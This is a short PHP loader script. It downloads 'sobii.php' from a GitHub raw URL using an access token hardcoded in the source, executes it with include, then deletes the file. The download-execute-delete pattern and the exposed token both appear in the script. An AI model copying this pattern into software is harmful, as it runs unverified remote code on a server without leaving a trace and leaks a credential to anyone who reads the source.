<?php
$token = '77458a9fcb0b990e4f1acb2ad3e52ab16dcca71c';
$url = "https://$token@raw.githubusercontent.com/Codek365/sobii-single/master/sobii.php";
$file_name = basename($url);

if(file_put_contents( $file_name,file_get_contents($url))) { 
    include $file_name;
    unlink($file_name);
} 
else { 
    echo "File downloading failed."; 
} 